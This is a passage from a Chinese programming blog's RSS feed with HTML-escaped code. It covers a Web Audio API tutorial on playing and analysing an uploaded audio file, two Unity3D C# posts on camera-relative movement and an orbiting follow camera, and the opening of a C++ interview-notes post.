&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;file&amp;#34;&lt;/span> &lt;span class="na">accept&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;audio/*&amp;#34;&lt;/span> &lt;span class="na">onchange&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;onInputChange&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后在 javascript 里读文件内容。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">function&lt;/span> &lt;span class="nx">onInputChange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">reader&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">FileReader&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">reader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">onload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">event&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// event.target.result 就是我们的文件内容了
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">};&lt;/span>
&lt;span class="nx">reader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">readAsArrayBuffer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>文件读取就是这么简单，所以回到那个问题：说了那么多，音乐到底怎么放？&lt;/p>
&lt;p>答案是用&lt;code>AudioContext&lt;/code>的&lt;code>decodeAudioData&lt;/code>方法。&lt;/p>
&lt;p>所以从上面的 js 里做少许修改——&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="c1">// 创建一个新的 AudioContext
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">ctx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">AudioContext&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">onInputChange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">reader&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">FileReader&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">reader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">onload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">event&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// event.target.result 就是我们的文件内容了
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 解码它
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">decodeAudioData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">event&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">target&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">result&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">decoded&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 解码后的音频数据作为音频源
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">const&lt;/span> &lt;span class="nx">audioBufferSourceNode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createBufferSource&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">audioBufferSourceNode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">buffer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">decoded&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 把音源 node 和输出 node 连接，boom——
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">audioBufferSourceNode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">connect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">destination&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">audioBufferSourceNode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 收工。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">});&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="nx">reader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">readAsArrayBuffer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="15-分析频谱">1.5 分析频谱&lt;/h3>
&lt;p>频谱的概念我建议搜一下&lt;strong>傅里叶变换&lt;/strong>，关于时域和频域转换的计算过程和数学原理直接略（因为不懂），至今我还只理解到时域和频域的概念以及傅里叶变换的实现接受采样返回采样数一半长的频域数据&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>不班门弄斧了。&lt;/p>
&lt;p>以前写&lt;code>python&lt;/code>的时候用的&lt;code>numpy&lt;/code>来进行傅里叶变换取得频域数据，现在在浏览器上用 js 着实有些难受。不过幸好，&lt;code>AudioContext&lt;/code>直接支持了一个音频分析的 node，叫做&lt;code>AudioAnalyserNode&lt;/code>。&lt;/p>
&lt;p>这个 Node 处于音源 Node 和播放输出 Node 之间，想象一道数据流，音源 Node 把离散的采样数据交给 Analyser，Analyser 再交给输出 Node。&lt;/p>
&lt;p>直接看代码实例。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="c1">// 创建一个新的 AudioContext
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">ctx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">AudioContext&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// 解码后的音频数据作为音频源
&lt;/span>&lt;span class="c1">// 为了方便管理，将这些Node都放置在回调函数外部
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">audioBufferSourceNode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createBufferSource&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// 创建音频分析Node!
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">audioAnalyser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createAnalyser&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// 注意注意！这里配置傅里叶变换使用的采样窗口大小！比如说，我们要256个频域数据，那么采样就应该是512。
&lt;/span>&lt;span class="c1">// 具体对应频率请自行搜傅里叶变换相关博文。
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">audioAnalyser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fftSize&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">512&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">onInputChange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">reader&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">FileReader&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">reader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">onload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">event&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// event.target.result 就是我们的文件内容了
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 解码它
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">decodeAudioData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">event&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">target&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">result&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">decoded&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 停止原先的音频源
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">audioBufferSourceNode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stop&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// 先把音频源Node和Analyser连接。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">audioBufferSourceNode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">connect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">audioAnalyser&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 然后把Analyser和destination连接。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">audioAnalyser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">connect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">destination&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 修改音频源数据
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">audioBufferSourceNode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">buffer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">decoded&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">audioBufferSourceNode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 收工。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">});&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="nx">reader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">readAsArrayBuffer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nb">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">requestAnimationFrame&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 读取频域数据
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">const&lt;/span> &lt;span class="nx">freqData&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Uint8Array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">audioAnalyser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">frequencyBinCount&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">freqData&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>频域数据是二维的，频率（数组下标）和能量（下标对应值）。悄悄补一句，数学上应该说是该频率函数图像的振幅？&lt;/p>
&lt;p>其实获得了这个频域数据，继续画出我们常见的条状频域图就很容易了。参考我一朋友的博客。&lt;a class="link" href="https://misuzu.moe/music/index.html" target="_blank" rel="noopener"
>misuzu.moe&lt;/a>，可以看看效果。&lt;/p>
&lt;p>关于&lt;code>AudioContext&lt;/code>的介绍先到此为止，等我找时间继续写。&lt;/p>
&lt;blockquote>
&lt;p>PS：代码不保证复制粘贴就能运行，领会精神，遇到问题查查文档。MDN 比我这博客详细多了。&lt;/p>
&lt;/blockquote></description></item><item><title>Unity3D 键盘控制物体平面移动（操作相对于摄像机方向）</title><link>https://nnnewb.github.io/blog/p/unity3d-%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E7%89%A9%E4%BD%93%E5%B9%B3%E9%9D%A2%E7%A7%BB%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%AF%B9%E4%BA%8E%E6%91%84%E5%83%8F%E6%9C%BA%E6%96%B9%E5%90%91/</link><pubDate>Sat, 03 Nov 2018 18:57:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/unity3d-%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E7%89%A9%E4%BD%93%E5%B9%B3%E9%9D%A2%E7%A7%BB%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%AF%B9%E4%BA%8E%E6%91%84%E5%83%8F%E6%9C%BA%E6%96%B9%E5%90%91/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>目标是实现目标随摄像机方向的不同而进行不同方向移动——而且，目标不需要随摄像机一起旋转。&lt;/p>
&lt;h2 id="使用摄像机的四元数旋转">使用摄像机的四元数旋转&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c#" data-lang="c#"> &lt;span class="k">void&lt;/span> &lt;span class="n">HandleKeyboardAction&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="kt">var&lt;/span> &lt;span class="n">horizontal&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Input&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetAxis&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Horizontal&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">PlayerMotionScaleLevel&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">deltaTime&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">var&lt;/span> &lt;span class="n">vertical&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Input&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetAxis&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Vertical&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">PlayerMotionScaleLevel&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">deltaTime&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">var&lt;/span> &lt;span class="n">motion&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">rotation&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Vector3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">horizontal&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">vertical&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">var&lt;/span> &lt;span class="n">mag&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">motion&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">magnitude&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">motion&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">y&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">Player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">position&lt;/span> &lt;span class="p">+=&lt;/span> &lt;span class="n">motion&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">normalized&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">mag&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>极其简单的做法，获取到键盘移动的轴之后，用摄像机的旋转四元数乘一下，即可得到旋转后的向量，加上去就 ok 了。&lt;/p>
&lt;p>需要注意的是这里用摄像机的四元数旋转要求摄像机必须只在 x 和 y 两个轴旋转。&lt;/p>
&lt;p>先备份一下三维向量的数量值，这是为了能保证摄像机向上和向下看时，平面 x 和 z 轴上的分量不会过小，保持一致的移动速度。&lt;/p>
&lt;p>用四元数旋转完成后，去除 y 轴的值，使目标只在当前平面上移动。再用算出来的向量的单位向量乘上之前备份的数量值，得到平面上移动的偏移向量。&lt;/p>
&lt;p>最后，算出新的位置坐标，赋值，完事儿。&lt;/p></description></item><item><title>Unity3d 摄像机跟随旋转的方案</title><link>https://nnnewb.github.io/blog/p/unity3d-%E6%91%84%E5%83%8F%E6%9C%BA%E8%B7%9F%E9%9A%8F%E6%97%8B%E8%BD%AC%E7%9A%84%E6%96%B9%E6%A1%88/</link><pubDate>Sat, 03 Nov 2018 18:20:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/unity3d-%E6%91%84%E5%83%8F%E6%9C%BA%E8%B7%9F%E9%9A%8F%E6%97%8B%E8%BD%AC%E7%9A%84%E6%96%B9%E6%A1%88/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>主要想探讨的是如何令摄像机随鼠标操作进行旋转和移动，摄像机跟随的脚本官方就有 Example。&lt;/p>
&lt;h2 id="方案独立的角度变量">方案：独立的角度变量&lt;/h2>
&lt;p>主要的特点是使用独立的角度变量，每次处理鼠标移动操作都会创建一个新的&lt;code>Quaternion&lt;/code>用于计算。&lt;/p>
&lt;p>先看 Demo。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c#" data-lang="c#">&lt;span class="k">public&lt;/span> &lt;span class="k">class&lt;/span> &lt;span class="nc">PlayerControls&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">MonoBehaviour&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="k">public&lt;/span> &lt;span class="n">GameObject&lt;/span> &lt;span class="n">Player&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">public&lt;/span> &lt;span class="kt">float&lt;/span> &lt;span class="n">Distance&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">//public float CameraRepositionSpeed;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="kt">float&lt;/span> &lt;span class="n">MouseMotionScaleLevel&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">public&lt;/span> &lt;span class="kt">bool&lt;/span> &lt;span class="n">ReverseAxisY&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">public&lt;/span> &lt;span class="kt">float&lt;/span> &lt;span class="n">PitchMaximum&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">public&lt;/span> &lt;span class="kt">float&lt;/span> &lt;span class="n">PitchMinimum&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">private&lt;/span> &lt;span class="kt">float&lt;/span> &lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundX&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">private&lt;/span> &lt;span class="kt">float&lt;/span> &lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundY&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">private&lt;/span> &lt;span class="n">Vector3&lt;/span> &lt;span class="m">_&lt;/span>&lt;span class="n">PositionTarget&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Use this for initialization
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">void&lt;/span> &lt;span class="n">Start&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Update is called once per frame
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">void&lt;/span> &lt;span class="n">Update&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundX&lt;/span> &lt;span class="p">+=&lt;/span> &lt;span class="n">Input&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetAxis&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Mouse Y&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">MouseMotionScaleLevel&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">deltaTime&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ReverseAxisY&lt;/span> &lt;span class="p">?&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="m">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundY&lt;/span> &lt;span class="p">+=&lt;/span> &lt;span class="n">Input&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetAxis&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Mouse X&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">MouseMotionScaleLevel&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">deltaTime&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundX&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Mathf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Clamp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PitchMinimum&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PitchMaximum&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="m">_&lt;/span>&lt;span class="n">PositionTarget&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">position&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="n">Quaternion&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Euler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="p">(-&lt;/span>&lt;span class="n">Player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">forward&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">Distance&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">//transform.position = Vector3.Lerp(transform.position, _PositionTarget, Time.deltaTime * CameraRepositionSpeed);
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">position&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="m">_&lt;/span>&lt;span class="n">PositionTarget&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">LookAt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">transform&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>核心在于&lt;code>_CurrentCameraAngleAroundX&lt;/code>和&lt;code>_CurrentCameraAngleAroundY&lt;/code>以及&lt;code>Distance&lt;/code>，这三个变量共同决定了以玩家&lt;code>Player&lt;/code>为原点的极坐标系下摄像机所处的空间位置。&lt;/p>
&lt;p>计算坐标时只需要通过&lt;code>Quaternion.Euler&lt;/code>来取得旋转四元数，以玩家为原点衍生一条（0,0,-1）的向量并乘上四元数以旋转至&lt;code>Player&lt;/code>指向摄像机的方向，最后乘上&lt;code>Distance&lt;/code>，即可得到摄像机相对玩家的偏移。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c#" data-lang="c#">&lt;span class="m">_&lt;/span>&lt;span class="n">PositionTarget&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">position&lt;/span> &lt;span class="p">+&lt;/span>
&lt;span class="n">Quaternion&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Euler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="m">_&lt;/span>&lt;span class="n">CurrentCameraAngleAroundY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">*&lt;/span>
&lt;span class="p">(-&lt;/span>&lt;span class="n">Player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">forward&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">Distance&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后只要将摄像机放置在那个位置，然后&lt;code>LookAt&lt;/code>旋转到&lt;code>z&lt;/code>轴正方向指向玩家就完事儿了。&lt;/p></description></item><item><title>GameHollywood 面试笔记</title><link>https://nnnewb.github.io/blog/p/gamehollywood-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/</link><pubDate>Tue, 26 Jun 2018 17:22:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/gamehollywood-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>面试的职位是 C++后端开发工程师，主要聊的还是 C++。在过程中自我感觉面得还行，至少没&lt;a class="link" href="https://my.oschina.net/u/3888259/blog/1833040" target="_blank" rel="noopener"
>上次&lt;/a>那么蠢。&lt;/p>
&lt;p>聊的内容主要集中在 STL 和线程安全、资源管理的层面。&lt;/p>
&lt;p>惯例的，填完面试信息表并简历一起上交，然后等面试官来客套完，就开始聊技术了。&lt;/p>
&lt;blockquote>
&lt;p>注意，面试官的提问并非原话，有修饰和脑补。&lt;/p>
&lt;/blockquote>
&lt;h2 id="0-预热你用哪个版本的-c">0. 预热：你用哪个版本的 C++？&lt;/h2>
